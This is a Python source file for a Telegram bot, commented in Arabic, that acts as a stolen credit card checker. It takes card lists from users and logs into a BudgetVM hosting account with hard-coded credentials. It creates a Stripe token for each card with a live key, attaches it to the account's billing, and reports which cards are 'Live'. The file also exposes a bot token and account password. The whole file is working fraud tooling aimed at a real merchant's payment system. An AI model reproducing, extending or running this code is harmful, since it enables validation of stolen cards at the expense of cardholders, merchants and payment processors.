import requests
import uuid
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==============================
# بيانات الدخول
EMAIL = "vefyonokna@necub.com"
PASSWORD = "111222333"

# BOT TOKEN
TOKEN = "8464532615:AAEulVRmRS3k5ls8Gi-MDFQlD7DH4Q8HerY"
bot = telebot.TeleBot(TOKEN)

# ==============================
# Stripe headers (صح)
stripe_headers = {
    "accept": "application/json",
    "accept-language": "en-US",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
}

# BudgetVM headers
budget_headers = {
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://portal.budgetvm.com",
    "Referer": "https://portal.budgetvm.com/MyAccount/MyBilling",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
}

# ==============================
# تخزين بيانات
user_cards, stats, messages, stop_flag = {}, {}, {}, {}

# ========== Dashboard ==========
def generate_dashboard(chat_id):
    s = stats.get(chat_id)
    if not s:
        return "⚠️ مفيش بيانات لسه."

    msg = "- MESSAGE 🔄 "
    if s['visa_checked']:
        msg += f"{s['visa_checked']} → {s['response']}\n\n"
    else:
        msg += f"{s['response']}\n\n"

    msg += "━━━━━━━━━━━━━━━━━━\n"
    if s["lives"]:
        msg += "\n💳 <b>Live Visa:</b>\n"
        for card in s["lives"]:
            msg += f"<code>{card}</code>\n"
    return msg


def generate_buttons(chat_id):
    s = stats.get(chat_id, {"approved":0,"declined":0,"cvv":0,"ccn":0,"total":0})
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"✅ Approved : {s['approved']}", callback_data="show_approved"),
        InlineKeyboardButton(f"❌ Declined : {s['declined']}", callback_data="show_declined"),
    )
    markup.add(
        InlineKeyboardButton(f"⚠️ خطأ بيانات : {s['cvv']}", callback_data="show_cvv"),
        InlineKeyboardButton(f"⛔ محظورة : {s['ccn']}", callback_data="show_ccn"),
    )
    markup.add(
        InlineKeyboardButton(f"🔢 Total : {s['total']}", callback_data="show_total")
    )
    markup.add(
        InlineKeyboardButton("⏹️ Stop Check", callback_data="stop_check")
    )
    return markup


# ========== الفحص ==========
def run_check(chat_id):
    cards = user_cards.get(chat_id, [])
    s = {"visa_checked":"","approved":0,"declined":0,"unknown":0,"total":0,"response":"",
         "lives":[],"cvv":0,"ccn":0}
    stop_flag[chat_id] = False
    stats[chat_id] = s

    # جلسة جديدة
    session = requests.Session()

    # تسجيل الدخول
    login_data = {"email": EMAIL, "password": PASSWORD}
    session.post("https://portal.budgetvm.com/auth/login", data=login_data)

    # GoogleAsk بعد تسجيل الدخول
    google_data = {
        "gEmail": EMAIL,
        "gUniqueask": "client",
        "setup": "2",
        "email": EMAIL,
        "gUnique": "client"
    }
    session.post("https://portal.budgetvm.com/auth/googleAsk", data=google_data)

    if "ePortalv1" not in session.cookies.get_dict():
        s["response"] = "❌ Login/GoogleAsk failed"
        stats[chat_id] = s
        return

    # فحص الكروت
    for card in cards:
        if stop_flag.get(chat_id):  # زر الإيقاف
            s["response"] = "⏹️ تم إيقاف الفحص"
            stats[chat_id] = s
            break

        s["total"] += 1
        s["visa_checked"] = card

        try:
            card_number, exp_month, exp_year, cvc = card.split("|")
        except:
            s["cvv"] += 1
            s["response"] = "❌ بيانات البطاقة غير صحيحة"
            continue

        # Stripe Token
        muid, sid, guid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
        stripe_data = (
            f"time_on_page=10000&guid={guid}&muid={muid}&sid={sid}"
            f"&key=pk_live_7sv0O1D5LasgJtbYpxp9aUbX&payment_user_agent=stripe.js"
            f"&card[number]={card_number}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&card[cvc]={cvc}"
        )

        stripe_response = session.post("https://api.stripe.com/v1/tokens", headers=stripe_headers, data=stripe_data)
        resp_json = stripe_response.json()

        if "id" not in resp_json:
            s["cvv"] += 1
            s["response"] = "❌ Token creation failed"
        else:
            token_id = resp_json["id"]
            card_response = session.post(
                "https://portal.budgetvm.com/MyGateway/Stripe/cardAdd",
                headers=budget_headers,
                cookies=session.cookies.get_dict(),
                data={"stripeToken": token_id}
            )
            try:
                resp_json = card_response.json()
            except:
                s["unknown"] += 1
                s["response"] = "❓ استجابة غير معروفة"
                continue

            result = str(resp_json.get("result",""))
            if resp_json.get("success") is True:
                s["approved"] += 1
                s["response"] = f"✅ {result}"
                s["lives"].append(card)
            elif "does not support" in result.lower() or "blocked" in result.lower():
                s["ccn"] += 1
                s["response"] = f"⛔ {result}"
            elif "declined" in result.lower():
                s["declined"] += 1
                s["response"] = f"❌ {result}"
            else:
                s["unknown"] += 1
                s["response"] = f"❓ {result}"

        stats[chat_id] = s

        # تحديث الرسالة
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=messages[chat_id],
                text=generate_dashboard(chat_id),
                parse_mode="HTML",
                reply_markup=generate_buttons(chat_id)
            )
        except Exception as e:
            print("Edit error:", e)


# ========== أوامر ==========
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "👋 أهلا! استخدم /check لبدء الفحص.", parse_mode="HTML")

@bot.message_handler(commands=['check'])
def ask_for_cards(message):
    bot.send_message(message.chat.id, "📥 ابعت البطاقات (نص أو ملف txt).", parse_mode="HTML")

# ملف txt
@bot.message_handler(content_types=['document'])
def handle_file(message):
    if not message.document.file_name.endswith(".txt"):
        bot.reply_to(message, "⚠️ لازم تبعت ملف txt.")
        return
    file_info = bot.get_file(message.document.file_id)
    file_content = bot.download_file(file_info.file_path).decode("utf-8")
    cards = [line.strip() for line in file_content.splitlines() if "|" in line]
    user_cards[message.chat.id] = cards
    s = {"approved":0,"declined":0,"unknown":0,"total":0,"response":"🔄 Starting...","lives":[],"cvv":0,"ccn":0,"visa_checked":""}
    stats[message.chat.id] = s
    msg = bot.send_message(message.chat.id, generate_dashboard(message.chat.id), parse_mode="HTML", reply_markup=generate_buttons(message.chat.id))
    messages[message.chat.id] = msg.message_id
    run_check(message.chat.id)

# نص
@bot.message_handler(func=lambda m: "|" in m.text)
def handle_cards_text(message):
    cards = [line.strip() for line in message.text.splitlines() if "|" in line]
    user_cards[message.chat.id] = cards
    s = {"approved":0,"declined":0,"unknown":0,"total":0,"response":"🔄 Starting...","lives":[],"cvv":0,"ccn":0,"visa_checked":""}
    stats[message.chat.id] = s
    msg = bot.send_message(message.chat.id, generate_dashboard(message.chat.id), parse_mode="HTML", reply_markup=generate_buttons(message.chat.id))
    messages[message.chat.id] = msg.message_id
    run_check(message.chat.id)

# الأزرار
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "stop_check":
        stop_flag[call.message.chat.id] = True
        bot.answer_callback_query(call.id, "⏹️ تم إيقاف الفحص")
    else:
        bot.answer_callback_query(call.id, "ℹ️ زر إحصائي فقط")

print("🤖 Bot is running...")
bot.infinity_polling()
